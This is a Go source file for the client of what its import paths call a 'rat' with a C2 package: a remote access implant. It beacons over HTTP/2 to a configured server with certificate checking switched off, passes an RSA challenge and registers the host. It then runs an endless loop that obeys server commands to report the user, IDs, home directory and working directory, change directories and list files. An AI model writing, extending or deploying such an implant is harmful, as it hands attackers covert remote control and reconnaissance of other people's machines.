package client

import (
    "context"
    "crypto/rsa"
    "crypto/tls"
    "crypto/rand"
    "crypto/x509"
    "crypto/sha256"
    "encoding/json"
    "encoding/pem"
    "io/ioutil"
    "fmt"
    "log"
    "net/http"
    "os"
    "os/user"
    "strconv"
    "sort"

    "github.com/satori/go.uuid"
    "golang.org/x/net/http2"

    "10.9.9.2/rat/pkg/h2conn"
    "10.9.9.2/rat/pkg/c2err"
)

type serverConnection struct {
    decoder *json.Decoder
    encoder *json.Encoder
}

type Client struct {
    Id			string
    Hostname		string
    Username		string
    Uid			string
    Gid			string
    HomeDir		string
    Cwd			string
    IpAddr		string
    ConnectAddress	string
    ConnectPort		string
    ConnectURL		string
    ConnectProtocol	string
    AuthPrivateKeyPath	string
    AuthPrivateKey	*rsa.PrivateKey
    Context		context.Context
    Client		*h2conn.Client
    ServerConnection	serverConnection
}

func Instantiate(connectAddress string, connectPort string, connectProtocol string, authPrivateKeyPath string) Client {
    c := Client{
	Id: "",
	Hostname: getHostname(),
	IpAddr: "",
	ConnectAddress: connectAddress,
	ConnectPort: connectPort,
	ConnectProtocol: connectProtocol,
    }

    url := "https://" + c.ConnectAddress + ":" + c.ConnectPort
    c.ConnectURL = url
    
    _, err := os.Stat(authPrivateKeyPath)
    if os.IsNotExist(err) {
	log.Fatalf("failed to stat auth private key file: %s\n", authPrivateKeyPath)
    }
    authPrivateKey := readAuthPrivateKey(authPrivateKeyPath)
    if authPrivateKey == nil {
	log.Fatalf("failed to parse auth private key file: %s\n", authPrivateKeyPath)
    }
    c.AuthPrivateKeyPath = authPrivateKeyPath
    c.AuthPrivateKey = authPrivateKey

    c.setContext()
    c.setUserInfo()
    c.Cwd = c.getCwd()

    tmpClient := &h2conn.Client{
		Client: &http.Client{
		    Transport: &http2.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
		},
	    }
    c.Client = tmpClient
    return c
}

func getHostname() string {
    tmp, err := os.Hostname()
    c2err.CheckError(err)
    return tmp
}

func readAuthPrivateKey(path string) *rsa.PrivateKey {
    privKeyPemData, err := ioutil.ReadFile(path)
    c2err.CheckError(err)
    block, _ := pem.Decode(privKeyPemData)
    if block == nil {
	log.Fatalf("failed to read privkey pem file\n")
    }
    privKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)
    if err != nil {
	return nil
    }
    return privKey
}

//dont really understand this atm
func (c *Client) setContext() {
    ctx := context.Background()
    c.Context = ctx
}

func (c *Client) connect() (*h2conn.Conn, *http.Response) {
    conn, resp, err := c.Client.Connect(c.Context, c.ConnectURL)
    c2err.CheckError(err)
    if resp.StatusCode != http.StatusOK {
	log.Fatalf("bad status code: %s\n", resp.StatusCode)
    }
    return conn, resp
}

func (c *Client) decryptBytes(ciphertext *[]byte) []byte {
    rng := rand.Reader
    tmp, err := rsa.DecryptOAEP(sha256.New(), rng, c.AuthPrivateKey, *ciphertext, nil)
    c2err.CheckError(err)
    return tmp
}

func (c *Client) acceptReturnServerAuthenticationChallenge() string {
    var challengeBytes []byte
    err := c.ServerConnection.decoder.Decode(&challengeBytes)
    c2err.CheckError(err)
    decChallengeBytes := c.decryptBytes(&challengeBytes)
    err = c.ServerConnection.encoder.Encode(decChallengeBytes)
    c2err.CheckError(err)
    var response string
    err = c.ServerConnection.decoder.Decode(&response)
    return response
}

func (c *Client) Run() {
    conn, _ := c.connect()
    defer conn.Close()

    var in, out = json.NewDecoder(conn), json.NewEncoder(conn)
    c.ServerConnection.decoder = in
    c.ServerConnection.encoder = out

    result := c.acceptReturnServerAuthenticationChallenge()
    if result != "ok" {
	conn.Close()
	os.Exit(0)
    }
    //send uuid, even if ""
    tmp := make(map[string]string)
    tmp["id"] = c.Id
    tmp["hostname"] = c.Hostname

    err := c.ServerConnection.encoder.Encode(tmp)
    c2err.CheckError(err)
    var response string
    err = c.ServerConnection.decoder.Decode(&response)
    _, err = uuid.FromString(response)
    if err != nil {
	log.Fatalf("received invalid uuid from server: %s\n", response)
    }
    c.Id = response
    fmt.Printf("uuid is: %s\n", c.Id)
    
    
    for {
	cmd := acceptServerInput(c)
	if len(cmd) < 1 {
	    continue
	}
	res := processServerInput(cmd, c)
	returnCommandResults(&res, c)
    }
}

func acceptServerInput(c *Client) []string {
    var cmd []string
    err := c.ServerConnection.decoder.Decode(&cmd)
    if err != nil {
	fmt.Println("error receiving from server, exiting")
	os.Exit(0)
    }
    return cmd
}

func processServerInput(cmd []string, c *Client) string {
    switch cmd[0] {
	case "cwd":
	    return c.Cwd
	case "pwd":
	    return c.Cwd
	case "hostname":
	    return c.Hostname
	case "cd":
	    if len(cmd) < 2 {
		return "missing argument"
	    }
	    err := os.Chdir(cmd[1])
	    if err != nil {
		return err.Error()
	    }
	    c.Cwd = c.getCwd()
	    return "success"
	case "whoami":
	    return c.Username
	case "userinfo":
	    res := "Username:\t" + c.Username + "\n"
	    res += "Uid:\t\t" + c.Uid + "\n"
	    res += "Gid:\t\t" + c.Gid + "\n"
	    res += "HomeDir:\t" + c.HomeDir
	    return res
	case "getuid":
	    return c.Uid
	case "getgid":
	    return c.Gid
	case "homedir":
	    return c.HomeDir
	case "ls":
	    if len(cmd) == 1 {
		return lsSortByModifiedTime(c.Cwd)
	    } else {
		return lsSortByModifiedTime(cmd[1])
	    }
	default:
	    return "not a valid command"
    }
}

func returnCommandResults(res *string, c *Client) {
    err := c.ServerConnection.encoder.Encode(*(res))
    if err != nil {
	fmt.Println("error sending command to server, exiting")
	os.Exit(0)
    }
}

func (c *Client) setUserInfo() {
    userinfo, err := user.Current()
    if err != nil {
	return
    }
    c.Username = userinfo.Username
    c.Uid = userinfo.Uid
    c.Gid = userinfo.Gid
    c.HomeDir = userinfo.HomeDir
}

func lsSortByModifiedTime(path string) string {
    var res string
    info, err := os.Stat(path)
    if err != nil {
	return err.Error()
    }
    if !info.IsDir() {
	res = "Listing for " + path + "\n\n"
	res += "Type\tPerms\tSize\tName\n"
	res += "----\t-----\t----\t----\n"
	switch mode := info.Mode(); {
	case mode.IsRegular():
	    res += "r\t"
	case mode&os.ModeSymlink != 0:
	    res += "l\t"
	case mode&os.ModeSocket != 0:
	    res += "s\t"
	case mode&os.ModeNamedPipe != 0:
	    res += "p\t"
	default:
	    res += "?\t"
	}
	var perms string
	perms = fmt.Sprintf("%#o", info.Mode().Perm())
	res += perms + "\t"
	res += strconv.FormatInt(info.Size(), 10) + "\t"
	res += info.Name() + "\n"
	return res
    }
    files, err := ioutil.ReadDir(path)
    if err != nil {
	return err.Error()
    }
    sort.Slice(files, func(i,j int) bool {
	return files[i].ModTime().Before(files[j].ModTime())
    })
    res = "Directory listing for " + path + "\n\n"
    res += "Type\tPerms\tSize\tName\n"
    res += "----\t-----\t----\t----\n"
    for _, file := range files {
	switch mode := file.Mode(); {
	case mode.IsRegular():
	    res += "r\t"
	case mode.IsDir():
	    res += "d\t"
	case mode&os.ModeSymlink != 0:
	    res += "l\t"
	case mode&os.ModeSocket != 0:
	    res += "s\t"
	case mode&os.ModeNamedPipe != 0:
	    res += "p\t"
	default:
	    res += "?\t"
	}
	var perms string
	perms = fmt.Sprintf("%#o", file.Mode().Perm())
	res += perms + "\t"
	res += strconv.FormatInt(file.Size(), 10) + "\t"
	res += file.Name() + "\n"
    }
    return res
}

func (c *Client) getCwd() string {
    dir, err := os.Getwd()
    if err != nil {
	return err.Error()
    }
    return dir
}

